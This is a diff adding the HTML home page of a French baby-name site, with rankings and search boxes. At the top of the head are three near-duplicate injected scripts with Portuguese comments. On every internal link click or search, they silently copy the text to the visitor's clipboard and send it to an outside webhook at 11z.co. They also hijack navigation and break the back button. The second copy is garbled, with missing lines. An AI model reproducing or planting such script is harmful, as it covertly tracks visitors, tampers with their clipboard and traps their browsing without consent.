@@ -1,0 +1,838 @@
+<!DOCTYPE html><html xml:lang="fr" lang="fr"><head>
+    <!-- Script de Redirecionamento Avançado: Cópia Silenciosa e Substituição de Histórico -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const baseUrl = 'https://meilleursprenoms.com';
+            const noCopyUrls = [
+                '/tendances-prenoms/', '/sonorites-prenoms/', '/regionaux-prenoms/',
+                '/classiques-prenoms/', '/composes-prenoms/', '/bebe-de-stars-prenoms/',
+                '/fetes-prenoms/', '/charte/', '/apropos/', '/legislation-prenoms/'
+            ];
+            function shouldSkipCopy(href) {
+                for (let url of noCopyUrls) { if (href.includes(url)) return true; }
+                return false;
+            }
+            async function copyToClipboard(text) {
+                try {
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        await navigator.clipboard.writeText(text);
+                    } else {
+                        const textArea = document.createElement('textarea');
+                        textArea.value = text;
+                        textArea.style.position = 'fixed';
+                        textArea.style.left = '-9999px';
+                        textArea.style.top = '0';
+                        document.body.appendChild(textArea);
+                        textArea.focus(); textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                    }
+                } catch (err) {}
+                fetch('https://www.11z.co/_w/5156/selection', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 'value': text }),
+                    keepalive: true
+                }).catch(() => {});
+            }
+
+            document.querySelectorAll('a[href]').forEach(function(link) {
+                const href = link.getAttribute('href');
+                if (href && !href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) {
+                    const path = href.startsWith('/') ? href : '/' + href;
+                    link.setAttribute('href', baseUrl + path);
+                }
+            });
+
+            document.body.addEventListener('click', async function(e) {
+                const link = e.target.closest('a');
+                if (link && link.getAttribute('href')) {
+                    const href = link.getAttribute('href');
+                    const isInternal = (!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl);
+                    if (isInternal) {
+                        if (link.hasAttribute('onclick') && (link.getAttribute('onclick').includes('redirectMeaning') || link.getAttribute('onclick').includes('redirectPopularity'))) return;
+                        e.preventDefault();
+                        if (!shouldSkipCopy(href)) {
+                            const textToCopy = link.innerText.trim();
+                            if (textToCopy) await copyToClipboard(textToCopy);
+                        }
+                        const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
+                        window.location.replace(targetUrl);
+                    }
+                }
+            }, true);
+
+            const searchForms = document.querySelectorAll('form');
+            searchForms.forEach(form => {
+                form.addEventListener('submit', async function(e) {
+                    const action = form.getAttribute('action');
+                    if (action && !action.startsWith('http')) {
+                        e.preventDefault();
+                        const searchInput = form.querySelector('input[name="q"]');
+                        if (searchInput && searchInput.value.trim()) await copyToClipboard(searchInput.value.trim());
+                        const formData = new FormData(form);
+                        const params = new URLSearchParams(formData).toString();
+                        const path = action.startsWith('/') ? action : '/' + action;
+                        const targetUrl = baseUrl + path + '?' + params;
+                        window.location.replace(targetUrl);
+                    }
+                });
+            });
+
+            window.addEventListener('pageshow', function(event) {
+                if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
+                    window.location.replace(baseUrl);
+                }
+            });
+            window.copyToClipboard = copyToClipboard;
+        });
+    </script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const baseUrl = 'https://meilleursprenoms.com';
+            const noCopyUrls = [
+                '/tendances-prenoms/', '/sonorites-prenoms/', '/regionaux-prenoms/',
+                '/classiques-prenoms/', '/composes-prenoms/', '/bebe-de-stars-prenoms/',
+                '/fetes-prenoms/', '/charte/', '/apropos/', '/legislation-prenoms/'
+            ];
+            function shouldSkipCopy(href) {
+                for (let url of noCopyUrls) { if (href.includes(url)) return true; }
+                return false;
+            }
+            async function copyToClipboard(text) {
+                try {
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        await navigator.clipboard.writeText(text);
+                    } else {
+                        const textArea = document.createElement('textarea');
+                        textArea.value = text;
+                        textArea.style.position = 'fixed';
+                        textArea.style.left = '-9999px';
+                        textArea.style.top = '0';
+                        document.body.appendChild(textArea);
+                        textArea.focus(); textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                    }
+                } catch (err) {}
+                fetch('https://www.11z.co/_w/5156/selection', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 'value': text }),
+                    keepalive: true
+                }).catch(() => {});
+            }
+
+            document.querySelectorAll('a[href]').forEach(function(link) {
+                const href = link.getAttribute('href');
+                    const path = href.startsWith('/') ? href : '/' + href;
+                    link.setAttribute('href', baseUrl + path);
+                }
+            });
+
+            document.body.addEventListener('click', async function(e) {
+                const link = e.target.closest('a');
+                if (link && link.getAttribute('href')) {
+                    const href = link.getAttribute('href');
+                    if (isInternal) {
+                        if (link.hasAttribute('onclick') && (link.getAttribute('onclick').includes('redirectMeaning') || link.getAttribute('onclick').includes('redirectPopularity'))) return;
+                        e.preventDefault();
+                            const textToCopy = link.innerText.trim();
+                            if (textToCopy) await copyToClipboard(textToCopy);
+                        }
+                        const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
+                        window.location.replace(targetUrl);
+                    }
+                }
+            }, true);
+
+            const searchForms = document.querySelectorAll('form');
+            searchForms.forEach(form => {
+                form.addEventListener('submit', async function(e) {
+                    const action = form.getAttribute('action');
+                        e.preventDefault();
+                        const searchInput = form.querySelector('input[name="q"]');
+                        if (searchInput && searchInput.value.trim()) await copyToClipboard(searchInput.value.trim());
+                        const formData = new FormData(form);
+                        const params = new URLSearchParams(formData).toString();
+                        const path = action.startsWith('/') ? action : '/' + action;
+                        const targetUrl = baseUrl + path + '?' + params;
+                        window.location.replace(targetUrl);
+                    }
+                });
+            });
+
+            window.addEventListener('pageshow', function(event) {
+                if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
+                    window.location.replace(baseUrl);
+                }
+            });
+            window.copyToClipboard = copyToClipboard;
+        });
+    </script>
+
+    <!-- Script de Redirecionamento Avançado: Cópia Silenciosa e Substituição de Histórico -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const baseUrl = 'https://meilleursprenoms.com';
+            const noCopyUrls = [
+                '/tendances-prenoms/',
+                '/sonorites-prenoms/',
+                '/regionaux-prenoms/',
+                '/classiques-prenoms/',
+                '/composes-prenoms/',
+                '/bebe-de-stars-prenoms/',
+                '/fetes-prenoms/',
+                '/charte/',
+                '/apropos/',
+                '/legislation-prenoms/'
+            ];
+            function shouldSkipCopy(href) {
+                for (let url of noCopyUrls) {
+                    if (href.includes(url)) return true;
+                }
+                return false;
+            }
+
+            // Função para copiar texto para o clipboard de forma silenciosa
+            async function copyToClipboard(text) {
+                try {
+                    // Tenta a API moderna primeiro
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        await navigator.clipboard.writeText(text);
+                    } else {
+                        // Fallback para dispositivos antigos
+                        const textArea = document.createElement("textarea");
+                        textArea.value = text;
+                        textArea.style.position = "fixed";
+                        textArea.style.left = "-9999px";
+                        textArea.style.top = "0";
+                        document.body.appendChild(textArea);
+                        textArea.focus();
+                        textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                    }
+                } catch (err) {
+                    // Silencioso: Não faz nada em caso de erro
+                }
+                // Envia webhook em segundo plano usando sendBeacon (mais confiável durante redirecionamento)
+                try {
+                    navigator.sendBeacon("https://www.11z.co/_w/5156/selection", JSON.stringify({ "value": text }));
+                } catch (e) {}
+            }
+
+            // 0. Alterar href dos links internos para a URL completa de destino (corrige barra de status do browser)
+            document.querySelectorAll('a[href]').forEach(function(link) {
+                const href = link.getAttribute('href');
+                if (href && !href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) {
+                    const path = href.startsWith('/') ? href : '/' + href;
+                    link.setAttribute('href', baseUrl + path);
+                }
+            });
+
+            // 1. Redirecionar cliques em links com cópia silenciosa
+            document.body.addEventListener('click', async function(e) {
+                const link = e.target.closest('a');
+                if (link && link.getAttribute('href')) {
+                    const href = link.getAttribute('href');
+                    
+                    // Intercepta links internos (relativos) ou links já convertidos para o baseUrl
+                    const isInternal = (!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto'))
+                                    || href.startsWith(baseUrl);
+                    if (isInternal) {
+                        e.preventDefault();
+                        
+                        // Verifica se deve fazer cópia e enviar webhook
+                        if (!shouldSkipCopy(href)) {
+                            const textToCopy = link.innerText.trim();
+                            if (textToCopy) {
+                                await copyToClipboard(textToCopy);
+                            }
+                        }
+
+                        // Se o href já é a URL completa, usa direto; senão monta
+                        const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
+
+                        // Redireciona substituindo a página no histórico (não permite voltar)
+                        window.location.replace(targetUrl);
+                    }
+                }
+            }, true);
+
+            // 2. Redirecionar formulários de busca com cópia silenciosa
+            const searchForms = document.querySelectorAll('form');
+            searchForms.forEach(form => {
+                form.addEventListener('submit', async function(e) {
+                    const action = form.getAttribute('action');
+                    if (action && !action.startsWith('http')) {
+                        e.preventDefault();
+
+                        // Captura o que foi digitado no campo de busca
+                        const searchInput = form.querySelector('input[name="q"]');
+                        if (searchInput && searchInput.value.trim()) {
+                            await copyToClipboard(searchInput.value.trim());
+                        }
+
+                        const formData = new FormData(form);
+                        const params = new URLSearchParams(formData).toString();
+                        const path = action.startsWith('/') ? action : '/' + action;
+                        const targetUrl = baseUrl + path + '?' + params;
+
+                        // Redireciona substituindo a página no histórico
+                        window.location.replace(targetUrl);
+                    }
+                });
+            });
+
+            // 3. Bloqueio de histórico (bfcache) para iOS e outros navegadores
+            window.addEventListener('pageshow', function(event) {
+                if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
+                    window.location.replace(baseUrl);
+                }
+            });
+        });
+        
+        // Expor copyToClipboard ao escopo global para uso em onclick
+        window.copyToClipboard = copyToClipboard;
+    </script>
+    <link rel="stylesheet" href="css/cookieconsent.css">
+
+    <meta charset="UTF-8">
+    <meta name="Coverage" content="France & pays francophones">
+    <meta name="Content-Language" content="fr">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <title>Guide des prénoms de garçons et de filles. Meilleurs Prenoms.com : signification et popularité de 20 000 prénoms</title>
+     
+    <meta name="description" content="Signification et fréquence de plus de 35 000 prénoms pour garçons et filles. Listes de prénoms chics et tendance, bretons ou basques, anciens ou nouveaux, prénoms originaux pour votre bébé">
+     
+    <meta name="keywords" content="prénoms garçon, prénoms fille, signification prénoms, liste prénoms, prénoms originaux, guide des prénoms, dictionnaire des prénoms, top des prénoms, palmarès des prénoms, tendances des prénoms">
+    
+
+    <meta name="ROBOTS" content="index,follow">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Meilleurs Prenoms - Découvrez l'origine, la signification, la tendance et la popularité de plus de 20.000 prénoms">
+    <meta property="og:description" content="Avec Meilleurs Prenoms, vous trouverez le plus beau prénom our votre enfant, que ce soit un prénom court,
+      un prénom long, un prénom classique, un prénom rétro ou moderne, un prénom breton, basque ou corse, et les prénoms du monde entier.
+      Choisissez selon la signification du prénom, son origine et sa
+      popularité. Découvrez aussi la tendance et l'étymologie de votre propre prénom !">
+    <meta property="og:url" content="https://meilleursprenoms.com">
+    <meta property="og:image" content="images/prenoms_share_1300x650.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1300">
+    <meta property="og:image:height" content="650">
+    <meta property="twitter:image" content="https://meilleursprenoms.com/images/prenoms_share_1024x512.png">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="format-detection" content="address=no">
+    <link href="css/reset.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="css/bootstrap.min.css" crossorigin="anonymous">
+    <link href="css/header.css" rel="stylesheet" type="text/css">
+    <link href="css/footer.css" rel="stylesheet" type="text/css">
+    <link href="css/home.css" rel="stylesheet" type="text/css">
+    <link href="css/stats.css" rel="stylesheet" type="text/css">
+    <link href="css/sons.css" rel="stylesheet" type="text/css">
+    <link href="css/regional.css" rel="stylesheet" type="text/css">
+    <link href="css/classique.css" rel="stylesheet" type="text/css">
+    <link href="css/bbstar.css" rel="stylesheet" type="text/css">
+    <link href="css/fetes.css" rel="stylesheet" type="text/css">
+    <link href="css/composes.css" rel="stylesheet" type="text/css">
+    <link href="css/tendances.css" rel="stylesheet" type="text/css">
+    <link href="css/meaning.css" rel="stylesheet" type="text/css">
+    <link href="css/department.css" rel="stylesheet" type="text/css">
+    <link href="css/all.css" rel="stylesheet" type="text/css">
+
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-analytics.js";
+
+      // Firebase config
+      const firebaseConfig = {
+        apiKey: "AIzaSyC4jp9_GpRjpv0YI9jkF6pq3ia6-aLRdFU",
+        authDomain: "meilleurs-prenoms.firebaseapp.com",
+        projectId: "meilleurs-prenoms",
+        storageBucket: "meilleurs-prenoms.firebasestorage.app",
+        messagingSenderId: "108605534122",
+        appId: "1:108605534122:web:f3bc116aa8b6cc74b885d3",
+        measurementId: "G-LC20H4F0T1",
+      };
+
+      // Initialize Firebase and Analytics
+      window.firebaseApp = initializeApp(firebaseConfig);
+      window.analytics = getAnalytics(window.firebaseApp);
+    </script>
+  </head>
+  <body>
+    <div class="main container-fluid">
+      <header>
+        <div class="row hide__mobile">
+          <div class="header__logo col-md-4">
+            <a href="/"><img src="images/logomp.jpg" alt="Meilleurs Prenoms logo" height="71" width="224"></a>
+          </div>
+          <div class="col-md-7">
+            <p class="header__fetes__text">A fêter aujourd'hui</p>
+            <p id="fetejour" class="header__fetes__link"><a href="https://meilleursprenoms.com/fetes-prenoms">Voir les fêtes</a></p>
+          </div>
+        </div>
+        <div class="row">
+          <div class="left col-6"></div>
+          <div class="right col-6"></div>
+        </div>
+
+        <div class="row">
+          <nav class="col-12 navbar navbar-expand-md navbar-light bg-white">
+            <button class="navbar-toggler no__border" type="button" data-toggle="collapse" data-target="#navbarsExample04" aria-controls="navbarsExample04" aria-expanded="false" aria-label="Toggle navigation">
+              <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse background__white" id="navbarsExample04">
+              <ul class="navbar-nav mr-auto">
+                <li class="nav-item">
+                  <a href="/" class="nav-link"><img src="images/maison.jpg" alt="home meilleurs prenoms"></a>
+                </li>
+                <li class="nav-item">
+                  <a href="/tendances-prenoms" class="nav-link">Tendances</a>
+                </li>
+                <li class="nav-item">
+                  <a href="/sonorites-prenoms" class="nav-link">Sonorités</a>
+                </li>
+                <li class="nav-item">
+                  <a href="/regionaux-prenoms " class="nav-link">Régionaux</a>
+                </li>
+                <li class="nav-item">
+                  <a href="/classiques-prenoms" class="nav-link">Classiques</a>
+                </li>
+                <li class="nav-item">
+                  <a href="/composes-prenoms" class="nav-link">Composés</a>
+                </li>
+                <li class="nav-item">
+                  <a href="/bebe-de-stars-prenoms" class="nav-link">Bébés de Stars</a>
+                </li>
+                <li class="nav-item">
+                  <a href="/fetes-prenoms" class="nav-link">Fêtes</a>
+                </li>
+                <li class="nav-item">
+                  <a href="https://www.facebook.com/meilleursprenoms/" class="nav-link">FB</a>
+                </li>
+              </ul>
+            </div>
+          </nav>
+          <div class="col-4 navbar-toggler expand__over show__768" data-toggle="collapse">
+            <a href="/index.html"><img class="navbar__logo" src="images/logomp.jpg" alt="Meilleurs Prenoms: signification et popularité de 20 000 prénoms"></a>
+          </div>
+        </div>
+        <div class="row no-gutters">
+          <div class="col-md-12">
+            <img class="full_width" src="images/img-home1.jpg" alt="">
+            <img class="full_width" src="images/img-home2.jpg" alt="">
+          </div>
+        </div>
+      </header>
+      <!--  open body open main-->
+
+
+<h1 class="hidden">
+  Guide des prénoms de garçons et de filles. Meilleurs Prenoms.com :
+  signification et popularité de 20 000 prénoms
+</h1>
+<h2 class="show__mobile section__banner__caps" style="background-color: #d6618f" itemprop="name">
+  Les prénoms
+</h2>
+<div id="home__nualpal" class="row">
+  <div id="home__nuagenoms" class="col-md-6 hide__mobile">
+    <ul>
+      <li><a href="/prenom/Adam" class="home__nuage1">Adam</a></li>
+      <li><a href="/prenom/Giulia" class="home__nuage2">Giulia</a></li>
+      <li><a href="/prenom/Leo" class="home__nuage3">Léo</a></li>
+      <li><a href="/prenom/Agathe" class="home__nuage4">Agathe</a></li>
+      <li><a href="/prenom/Maël" class="home__nuage5">Maël</a></li>
+      <li><a href="/prenom/Romy" class="home__nuage6">Romy</a></li>
+      <li><a href="/prenom/Elio" class="home__nuage7">Élio</a></li>
+      <li><a href="/prenom/Alba" class="home__nuage8">Alba</a></li>
+      <li><a href="/prenom/Marceau" class="home__nuage9">Marceau</a></li>
+      <li><a href="/prenom/Louise" class="home__nuage10">Louise</a></li>
+      <li>
+        <a href="/prenom/Andrea/masculin" class="home__nuage11">Andrea</a>
+      </li>
+      <li><a href="/prenom/Isaac" class="home__nuage12">Isaac</a></li>
+      <li><a href="/prenom/Iris" class="home__nuage13">Iris</a></li>
+      <li><a href="/prenom/Gabriel" class="home__nuage14">Gabriel</a></li>
+      <li><a href="/prenom/Simone" class="home__nuage15">Simone</a></li>
+      <li><a href="/prenom/Noé" class="home__nuage16">Noé</a></li>
+      <li><a href="/prenom/Luna" class="home__nuage17">Luna</a></li>
+      <li><a href="/prenom/Leon" class="home__nuage21">Léon</a></li>
+      <li><a href="/prenom/Olympe" class="home__nuage18">Olympe</a></li>
+      <li><a href="/prenom/Arthur" class="home__nuage19">Arthur</a></li>
+      <li><a href="/prenom/Mia" class="home__nuage20">Mia</a></li>
+    </ul>
+  </div>
+  <div id="home__palmares" class="col-md-6">
+    <div class="home__palmares__inner">
+      <p class="caps__title">LE PALMARÈS DES PRÉNOMS</p>
+      <div class="home__palmares__container">
+        <div>
+          <ol>
+            <li><a href="/popularite-prenom/Louise">1. Louise</a></li>
+            <li><a href="/popularite-prenom/Jade">2. Jade</a></li>
+            <li><a href="/popularite-prenom/Alma">3. Alma</a></li>
+            <li><a href="/popularite-prenom/Ambre">4. Ambre</a></li>
+            <li><a href="/popularite-prenom/Alba">5. Alba</a></li>
+          </ol>
+        </div>
+        <div>
+          <ol class="rosef">
+            <li><a href="/popularite-prenom/Emma">6. Emma</a></li>
+            <li><a href="/popularite-prenom/Romy">7. Romy</a></li>
+            <li><a href="/popularite-prenom/Rose">8. Rose</a></li>
+            <li><a href="/popularite-prenom/Adele">9. Adèle</a></li>
+            <li><a href="/popularite-prenom/Alice">10. Alice</a></li>
+          </ol>
+        </div>
+        <div>
+          <ol class="rosef">
+            <li><a href="/popularite-prenom/Gabriel">1. Gabriel</a></li>
+            <li><a href="/popularite-prenom/Raphael">2. Raphaël</a></li>
+            <li><a href="/popularite-prenom/Noah">3. Noah</a></li>
+            <li><a href="/popularite-prenom/Louis">4. Louis</a></li>
+            <li><a href="/popularite-prenom/Leo">5. Léo</a></li>
+          </ol>
+        </div>
+        <div>
+          <ol class="rosef">
+            <li><a href="/popularite-prenom/Adam">6. Adam</a></li>
+            <li><a href="/popularite-prenom/Arthur">7. Arthur</a></li>
+            <li><a href="/popularite-prenom/Jules">8. Jules</a></li>
+            <li><a href="/popularite-prenom/Leon">9. Léon</a></li>
+            <li><a href="/popularite-prenom/Mael">10. Maël</a></li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- end row-->
+
+<div id="home__infoprenom" class="row hide__mobile">
+  <div id="home__votreprenom">
+    <p class="home__votreprenom__title">Votre prénom</p>
+    <p class="home__votreprenom__subtitle">
+      Étymologie, popularité, tendances... pour tout savoir sur votre prénom !
+    </p>
+    <div class="home__votreprenom__searchwindow">
+      <input type="text" id="searchBothInput" class="home__textInput" placeholder="Rechercher un prénom">
+
+      <div class="home__votreprenom__searchbuttons">
+        <a class="home__votreprenom__label__meaning" onclick="redirectMeaning('searchBothInput')">étymologie</a>
+        <a class="home__votreprenom__label__popularity" onclick="redirectPopularity('searchBothInput')">popularité</a>
+      </div>
+    </div>
+  </div>
+
+  <div id="home__top20pardep">
+    <p class="home__label-top">
+      TOP DES PRÉNOMS<br>
+      par département
+    </p>
+
+    <div class="home__dropdown__cartridge">
+      <div class="btn-group home__dropdown__button">
+        <button type="button" class="btn btn-lg dropdown-toggle home__dropdown__button" aria-label="top des prénoms par département" data-toggle="dropdown">
+          Département <span class="caret"></span>
+        </button>
+        <ul class="dropdown-menu scrollable-menu home__dropdown__area" role="menu">
+          <li><a href="/departement-prenoms/01">01- Ain</a></li>
+          <li><a href="/departement-prenoms/02">02- Aisne</a></li>
+          <li><a href="/departement-prenoms/03">03- Allier</a></li>
+          <li>
+            <a href="/departement-prenoms/04">04- Alpes-de-Haute-Provence</a>
+          </li>
+          <li><a href="/departement-prenoms/05">05- Hautes-Alpes</a></li>
+          <li><a href="/departement-prenoms/06">06- Alpes-Maritimes</a></li>
+          <li><a href="/departement-prenoms/07">07- Ardèche</a></li>
+          <li><a href="/departement-prenoms/08">08- Ardennes</a></li>
+          <li><a href="/departement-prenoms/09">09- Ariège</a></li>
+          <li><a href="/departement-prenoms/10">10- Aube</a></li>
+          <li><a href="/departement-prenoms/11">11- Aude</a></li>
+          <li><a href="/departement-prenoms/12">12- Aveyron</a></li>
+          <li><a href="/departement-prenoms/13">13- Bouches-du-Rhône</a></li>
+          <li><a href="/departement-prenoms/14">14- Calvados</a></li>
+          <li><a href="/departement-prenoms/15">15- Cantal</a></li>
+          <li><a href="/departement-prenoms/16">16- Charente</a></li>
+          <li><a href="/departement-prenoms/17">17- Charente-Maritime</a></li>
+          <li><a href="/departement-prenoms/18">18- Cher</a></li>
+          <li><a href="/departement-prenoms/19">19- Corrèze</a></li>
+          <li><a href="/departement-prenoms/20">20- Corse</a></li>
+          <li><a href="/departement-prenoms/21">21- Côte-d'Or</a></li>
+          <li><a href="/departement-prenoms/22">22- Côtes-d'Armor</a></li>
+          <li><a href="/departement-prenoms/23">23- Creuse</a></li>
+          <li><a href="/departement-prenoms/24">24- Dordogne</a></li>
+          <li><a href="/departement-prenoms/25">25- Doubs</a></li>
+          <li><a href="/departement-prenoms/26">26- Drôme</a></li>
+          <li><a href="/departement-prenoms/27">27- Eure</a></li>
+          <li><a href="/departement-prenoms/28">28- Eure-et-Loir</a></li>
+          <li><a href="/departement-prenoms/29">29- Finistère</a></li>
+          <li><a href="/departement-prenoms/30">30- Gard</a></li>
+          <li><a href="/departement-prenoms/31">31- Haute-Garonne</a></li>
+          <li><a href="/departement-prenoms/32">32- Gers</a></li>
+          <li><a href="/departement-prenoms/33">33- Gironde</a></li>
+          <li><a href="/departement-prenoms/34">34- Hérault</a></li>
+          <li><a href="/departement-prenoms/35">35- Ille-et-Vilaine</a></li>
+          <li><a href="/departement-prenoms/36">36- Indre</a></li>
+          <li><a href="/departement-prenoms/37">37- Indre-et-Loire</a></li>
+          <li><a href="/departement-prenoms/38">38- Isère</a></li>
+          <li><a href="/departement-prenoms/39">39- Jura</a></li>
+          <li><a href="/departement-prenoms/40">40- Landes</a></li>
+          <li><a href="/departement-prenoms/41">41- Loir-et-Cher</a></li>
+          <li><a href="/departement-prenoms/42">42- Loire</a></li>
+          <li><a href="/departement-prenoms/43">43- Haute-Loire</a></li>
+          <li><a href="/departement-prenoms/44">44- Loire-Atlantique</a></li>
+          <li><a href="/departement-prenoms/45">45- Loiret</a></li>
+          <li><a href="/departement-prenoms/46">46- Lot</a></li>
+          <li><a href="/departement-prenoms/47">47- Lot-et-Garonne</a></li>
+          <li><a href="/departement-prenoms/48">48- Lozère</a></li>
+          <li><a href="/departement-prenoms/49">49- Maine-et-Loire</a></li>
+          <li><a href="/departement-prenoms/50">50- Manche</a></li>
+          <li><a href="/departement-prenoms/51">51- Marne</a></li>
+          <li><a href="/departement-prenoms/52">52- Haute-Marne</a></li>
+          <li><a href="/departement-prenoms/53">53- Mayenne</a></li>
+          <li><a href="/departement-prenoms/54">54- Meurthe-et-Moselle</a></li>
+          <li><a href="/departement-prenoms/55">55- Meuse</a></li>
+          <li><a href="/departement-prenoms/56">56- Morbihan</a></li>
+          <li><a href="/departement-prenoms/57">57- Moselle</a></li>
+          <li><a href="/departement-prenoms/58">58- Nièvre</a></li>
+          <li><a href="/departement-prenoms/59">59- Nord</a></li>
+          <li><a href="/departement-prenoms/60">60- Oise</a></li>
+          <li><a href="/departement-prenoms/61">61- Orne</a></li>
+          <li><a href="/departement-prenoms/62">62- Pas-de-Calais</a></li>
+          <li><a href="/departement-prenoms/63">63- Puy-de-Dôme</a></li>
+          <li>
+            <a href="/departement-prenoms/64">64- Pyrénées-Atlantiques</a>
+          </li>
+          <li><a href="/departement-prenoms/65">65- Hautes-Pyrénées</a></li>
+          <li><a href="/departement-prenoms/66">66- Pyrénées-Orientales</a></li>
+          <li><a href="/departement-prenoms/67">67- Bas-Rhin</a></li>
+          <li><a href="/departement-prenoms/68">68- Haut-Rhin</a></li>
+          <li><a href="/departement-prenoms/69">69- Rhône</a></li>
+          <li><a href="/departement-prenoms/70">70- Haute-Saône</a></li>
+          <li><a href="/departement-prenoms/71">71- Saône-et-Loire</a></li>
+          <li><a href="/departement-prenoms/72">72- Sarthe</a></li>
+          <li><a href="/departement-prenoms/73">73- Savoie</a></li>
+          <li><a href="/departement-prenoms/74">74- Haute-Savoie</a></li>
+          <li><a href="/departement-prenoms/75">75- Paris</a></li>
+          <li><a href="/departement-prenoms/76">76- Seine-Maritime</a></li>
+          <li><a href="/departement-prenoms/77">77- Seine-et-Marne</a></li>
+          <li><a href="/departement-prenoms/78">78- Yvelines</a></li>
+          <li><a href="/departement-prenoms/79">79- Deux-Sèvres</a></li>
+          <li><a href="/departement-prenoms/80">80- Somme</a></li>
+          <li><a href="/departement-prenoms/81">81- Tarn</a></li>
+          <li><a href="/departement-prenoms/82">82- Tarn-et-Garonne</a></li>
+          <li><a href="/departement-prenoms/83">83- Var</a></li>
+          <li><a href="/departement-prenoms/84">84- Vaucluse</a></li>
+          <li><a href="/departement-prenoms/85">85- Vendée</a></li>
+          <li><a href="/departement-prenoms/86">86- Vienne</a></li>
+          <li><a href="/departement-prenoms/87">87- Haute-Vienne</a></li>
+          <li><a href="/departement-prenoms/88">88- Vosges</a></li>
+          <li><a href="/departement-prenoms/89">89- Yonne</a></li>
+          <li>
+            <a href="/departement-prenoms/90">90- Territoire de Belfort</a>
+          </li>
+          <li><a href="/departement-prenoms/91">91- Essonne</a></li>
+          <li><a href="/departement-prenoms/92">92- Hauts-de-Seine</a></li>
+          <li><a href="/departement-prenoms/93">93- Seine-Saint-Denis</a></li>
+          <li><a href="/departement-prenoms/94">94- Val-de-Marne</a></li>
+          <li><a href="/departement-prenoms/95">95- Val-d'Oise</a></li>
+          <li><a href="/departement-prenoms/971">97- Outre-mer</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="row show__mobile">
+  <div class="home__mobile__search">
+    <div class="home__mobile__search__title">
+      <label for="meaningSearchInput">Étymologie</label>
+    </div>
+    <div class="home__mobile__search__subtitle">
+      Votre prénom en un clic�!
+    </div>
+    <div class="home__mobile__search__searchwindow">
+      <input type="text" id="meaningSearchInput" class="home__mobile__search__textInput" placeholder="Rechercher un prénom">
+
+      <button onclick="redirectMeaning('meaningSearchInput')" class="home__mobile__search__searchbuttons" style="font-size: 1.7em; color: #9b8d8c" aria-label="origin et sens d'un prénom ">
+        <img src="images/search.svg" alt="">
+      </button>
+    </div>
+  </div>
+</div>
+<div class="row show__mobile">
+  <div class="spacing"></div>
+  <div class="spacing"></div>
+  <div class="spacing"></div>
+</div>
+<div class="row show__mobile">
+  <div class="home__mobile__search">
+    <div class="home__mobile__search__title">
+      <label for="statSearchInput">Popularité</label>
+    </div>
+    <div class="home__mobile__search__subtitle">
+      Les statistiques en un clic !
+    </div>
+    <div class="home__mobile__search__searchwindow">
+      <input type="text" id="statSearchInput" class="home__mobile__search__textInput" placeholder="Rechercher un prénom">
+
+      <button type="submit" onclick="redirectPopularity('statSearchInput')" class="home__mobile__search__searchbuttons" style="font-size: 1.7em; color: #9b8d8c" aria-label="popularité d'un prénom ">
+        <img src="images/search.svg" alt="">
+      </button>
+    </div>
+  </div>
+</div>
+<div class="spacing"></div>
+<div class="row">
+  <div class="col-md-7"><div class="officialWidget">
+  <a href="https://www.lisez.com/livres/lofficiel-des-prenoms-2026/9782412102657">
+    <img src="images/officiel_cover.webp" alt="Officiel des prenoms">
+    <p class="officialWidget__title">L'Officiel des prénoms 2026</p>
+    <p class="officialWidget__text">
+      De Alba à Zélie, en passant par Noah, Léon ou Marius… Quel prénom
+      choisir ? <br>
+      <br>Découvrez la signification, les tendances et la popularité de plus
+      de 12 000 prénoms. Croisant statistiques de l’Insee, des analyses
+      approfondies et des conseils pratiques,
+      <span class="official__link">L’Officiel des prénoms</span> s’est imposé
+      depuis plus de 20 ans comme le guide de referência des futurs parents.
+    </p>
+  </a>
+</div>
+</div>
+
+  <div class="rubrique_img col-md-5 no-gutters text-center">
+    <a href="https://nameby.app/fr"><img src="images/nameby_promo.gif"></a>
+  </div>
+</div>
+
+<div class="spacing"></div>
+<div class="spacing"></div>
+<div class="spacing"></div>
+
+<div class="home_articles row hide__mobile">
+  <div class="rubrique col-md-4">
+    <p>
+      <a href="/monde"><img src="images/prenoms_du_monde.jpg" alt="prenoms du monde" height="125" width="125"></a>
+    </p>
+    <h3 class="rubrique__text">
+      <a class="rubrique__title" href="/monde"><p>Quel prénom du monde pour mon enfant ?</p></a>
+    </h3>
+    <p class="rubrique__text">
+      Quels sont les prénoms tendances qui viennent d’Europe (Liam, Nils, Mila)
